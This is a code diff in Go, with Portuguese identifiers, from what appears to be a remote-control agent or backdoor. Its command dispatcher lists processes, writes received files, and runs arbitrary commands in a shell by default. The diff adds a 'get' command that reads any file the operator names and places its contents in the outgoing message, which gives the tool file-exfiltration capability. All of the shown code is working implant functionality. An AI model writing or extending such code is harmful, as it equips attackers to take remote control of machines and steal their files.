@@ -77,9 +77,26 @@ func executaComando(comando string, indice int) (resposta string) {
 		resposta = listaProcessos()
 	case "send":
 		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
+	case "get":
+		resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)	
 	default:
 		resposta = executaComandoEmShell(comando)
 	}
+
+	return resposta
+}
+
+func enviarArquivo(comandoGet string, indice int) (resposta string) {
+	var err error
+	resposta = "Arquivo enviado com sucesso."
+	comandoSeparado := helpers.SeparaComando(comandoGet)	
+
+	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
+	if err != nil {
+		resposta = "Erro ao copiar o arquivo: " + err.Error()
+		mensagem.Comandos[indice].Arquivo.Erro = true
+	}
+	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]
 
 	return resposta
 }
